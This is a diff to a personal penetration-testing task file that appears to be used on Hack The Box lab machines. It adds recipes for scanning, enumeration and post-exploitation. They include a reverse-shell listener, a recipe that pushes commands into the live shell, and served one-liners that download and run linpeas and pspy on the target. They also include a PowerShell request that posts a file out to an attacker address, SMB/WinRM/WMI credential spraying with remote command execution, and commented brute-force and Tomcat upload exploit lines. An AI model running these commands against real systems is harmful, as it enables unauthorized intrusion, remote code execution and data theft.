@@ -7,9 +7,27 @@ default:
 update:
 	curl -s https://raw.githubusercontent.com/r0nk/hack/master/hack | sudo tee /usr/bin/hack | wc -l
 
+#install common tools on whatever env we're hackin from
+setup:
+	apt install jq scrot
+	go install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest
+	pdtm -ia
+
+local_search:
+	grep -ir username
+	grep -ir user
+	grep -ir pass
+	grep -ir passwd
+	grep -ir password
+	grep -ir "HTB{"
+
+b:
+	firefox $(hack ip):$(hack port)
+
 ftp:
 	ftp ftp@$(hack ip)
-	nmap --script ftp-* -p 21 $(hack ip) -o nmap-ftp.txt
+	nmap -sC -sV -p 21 $(hack ip) -o nmap.ftp.txt
+	nmap --script ftp-* -p 21 $(hack ip) -o nmap.ftp.brute.txt
 	openssl s_client -connect $(hack ip):$(hack port) -starttls ftp # Get certificate
 #if 'passive', just type passive on the client to disable
 
@@ -27,7 +45,11 @@ scope_level:
 nmap:
 	nmap -v -sV -sC -p- $(hack ip) -oA nmap_full
 
+pnmap:
+	nmap -Pn -v -sV -sC -p- $(hack ip) -oA nmap_full
+
 nmap_udp:
+	hack snmp_check
 	nmap -v -sU -p- $(hack ip) -oA nmap_udp
 
 #Get the target ip address from the current directory
@@ -46,7 +68,6 @@ default_device := "tun0"
 #Get our ip, for reverse shells and the like
 lip dev=default_device:
 	@ip -4 addr show {{dev}} | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
-
 
 #udp/5355, Non-dns hostname to ip
 LLMNR:
@@ -84,41 +105,71 @@ log-capture pane:
 	tmux capture-pane -t 0:{{pane}} -p -S-
 
 http:
-	echo $(hack domain) | katana | anew spider_urls | anew urls.txt
-	curl -L -s $(hack domain)/robots.txt -o robots.txt
-	echo $(hack domain) | dnsx -asn  -a -recon -resp > dnsx.txt
+	echo http://$(hack domain):$(hack port) | katana | anew spider_urls | anew urls.txt
+	curl -L -s http://$(hack domain):$(hack port)/robots.txt -o robots.txt
 	echo "vhosts 60" | anew todo.txt
 	echo "fields	60" | anew todo.txt
 	echo "param 60" | anew todo.txt
 	echo "paths 60" | anew todo.txt
 
-wl:
-	@find . /usr/share/seclists/ -type f | fzf
+tomcat:
+	@echo "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat"
+	@echo "find_manager 30" | anew todo.txt
+	@echo "try_common_manager_passwords 30" | anew todo.txt
+	#hydra -L test_users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f $(hack ip) -s $(hack port) http-get /manager/html
+	#msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set rhost $(hack ip) ; set rport $(hack port)"
+	@echo "auth.jsp 30" | anew todo.txt
+
+
+prompt:='wl'
+
+wl p=prompt:
+	@find . /usr/share/seclists/ -type f | fzf --prompt="{{p}} > "
 
 path_fuzz:
-	ffuf -u http://$(hack ip)/FUZZ -w $(hack wl) -recursion -od ffufo -ac
+	ffuf -u http://$(hack ip):$(hack port)/FUZZ -w $(hack wl paths) -recursion -od ffufo -ac
 
 path_fuzz_slow:
-	ffuf -u http://$(hack domain)/FUZZ -w $(hack wl) -recursion -od ffufo -ac -t 1 -p 0.1-0.3
+	ffuf -u http://$(hack domain)/FUZZ -w $(hack wl paths) -recursion -od ffufo -ac -t 1 -p 0.1-0.3
 
 subdomain_fuzz:
-	ffuf -u http://$(hack ip) -H "Host: FUZZ.$(head -n 1 domains.txt)" -w $(hack wl) -od ffufo -ac
+	ffuf -u "http://$(hack ip)" -H "Host: FUZZ.$(head -n 1 domains.txt)" -w $(hack wl subdomains) -od ffufo -ac
 
 rev port:
+	@tmux rename-window reverse
 	@hack lip
 	rlwrap -cAr nc -lvnp {{port}}
 
+srev port:
+	@tmux pipe-pane -o 'espeak -s 440'
+	@hack rev {{port}}
+
+#pipe things into the current running reverse shell
+prev cmd: 
+	tmux send-keys -t reverse.0  "{{cmd}}" Enter
+	@sleep 1.0 # give it time to run
+#
+	
 #start a http server for the current directory
 hs port:
-	ip addr | grep inet | sort
+	@echo curl http://$(hack lip)/
 	python3 -m http.server {{port}}
+
+creds_check user pass:
+	nxc --verbose smb $(hack ip) -u "{{user}}" -p '{{pass}}' -X "whoami"
+	nxc --verbose ldap $(hack ip) -u "{{user}}" -p '{{pass}}'
+	nxc --verbose winrm $(hack ip) -u "{{user}}" -p '{{pass}}' -X "whoami"
+	nxc --verbose wmi $(hack ip) -u "{{user}}" -p '{{pass}}' -x "whoami"
+	nxc --verbose wmi $(hack ip) -u "{{user}}" -p '{{pass}}' --local-auth -x "whoami"
 
 sqliraw:
 	sqlmap -r raw.http --risk 3 --level 5
 
 ldap:
-	nmap -sV --script "ldap* and not brute" -p 389 $(hack ip) -o nmap.ldap.txt
+	nmap -Pn -sV --script "ldap* and not brute" -p 389 $(hack ip) -o nmap.ldap.txt
 	ldapsearch -H ldap://$(hack ip)
+#nxc ldap $(hack ip) -u ldap -p "$(creds passwords ldap)" --query "(sAMAccountName=support)" ""
+#dump user info with creds, possibly get creds in user description
 
 field:
 	echo "reflection/xss	30" | anew todo.txt
@@ -132,8 +183,8 @@ field:
 	echo "sqli	30" | anew todo.txt
 
 #simple network management protocol check
-snmp-check:
-	sudo nmap -sU -sV -sC --open -p 161 $(hack ip)
+snmp_check:
+	sudo nmap -sU -sV -sC --open -p 161,162,10161,10162 $(hack ip) -oA nmap_snmp
 
 #simple network management protocol testing
 snmp:
@@ -144,9 +195,12 @@ snmp:
 
 smb:
 	enum4linux -a $(hack ip) | tee enum4linux.txt
-	enum4linux -u "guest" -p "" $(hack ip) | tee enum4linux.guest.txt
-	enum4linux -u "" -p "" $(hack ip) | tee enum4linux.empty.txt
+	enum4linux -a -u "guest" -p "" $(hack ip) | tee enum4linux.guest.txt
+	enum4linux -a -u "" -p "" $(hack ip) | tee enum4linux.empty.txt
+	smbmap -u 'guest' -p '' -d support.htb -H $(hack ip) | tee smbmap.txt
 	echo "lookupsid" | anew todo.txt
+	nxc smb $(hack ip) -u "guest" -p '' --rid-brute  | tee rid_brute.txt
+	grep User rid_brute.txt | tr '\\' ' ' | choose 6 | anew  users.txt
 	#lookupsid.py $(hack domain)@$(hack ip)
 	#cat sid.txt  | grep -i sidtypeuser | tr '\\' ' ' | choose 2 > users.txt
 
@@ -191,10 +245,14 @@ kerberos:
 	echo "kerbrute	30" | anew todo.txt
 	#kerberoasting, these spns are hashes that can be cracked for credentials.
 	echo "getuserspns	30" | anew todo.txt
-	nmap -sV -p $(hack port) --script="banner,krb5-enum-users" --script-args krb5-enum-users.realm="$(hack domain)",userdb=$(hack wl) $(hack ip)
+	nmap -Pn -sV -p $(hack port) --script="banner,krb5-enum-users" --script-args krb5-enum-users.realm="$(hack domain)",userdb=$(hack wl userdb) $(hack ip)
 
 sip:
 	nmap -sV -p $(hack port) --script="sip-enum-users,sip-methods"
+
+lfi:
+	echo "lfi/find_web_directory	60" | anew todo.txt
+	echo "lfi/attempt_log_rce	60" | anew todo.txt
 
 wordpress:
 	wpscan --url http://$(hack ip):$(hack port)
@@ -206,8 +264,28 @@ wordpress:
 active_directory_web_services:
 	echo "look_into/ADModule	60" | anew todo.txt
 
-
-linpeas:
-	curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+#serve linpeas on http port
+linpeas port:
+	curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o l.sh
+	@echo "curl http://$(hack lip)/l.sh -o /tmp/l; chmod 755 /tmp/l; /tmp/l" | xclip -i
+	python3 -m http.server {{port}}
 #cat > l < /dev/tcp/10.10.14.3/8888 # if the server doesn't have nc
 
+#serve linpeas on pspy port
+pspy port:
+	cp $(whereis pspy64 | choose 1) .
+	@echo "curl http://$(hack lip)/pspy64 -o /tmp/pspy64; chmod 755 /tmp/pspy64; /tmp/pspy64" | xclip -i
+	python3 -m http.server {{port}}
+
+
+stabilize_linux_shell:
+	echo python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+linux_priv_esc:
+	stabilize_linux_shell
+	echo "handlers/lpe" | anew todo.txt
+	hack prev "id ; uname -a; env"
+	echo "check_sudo" | anew todo.txt
+
+windows_file_post:
+	echo 'iwr -Uri http://10.10.14.12/ -Method Post -InFile w.out'
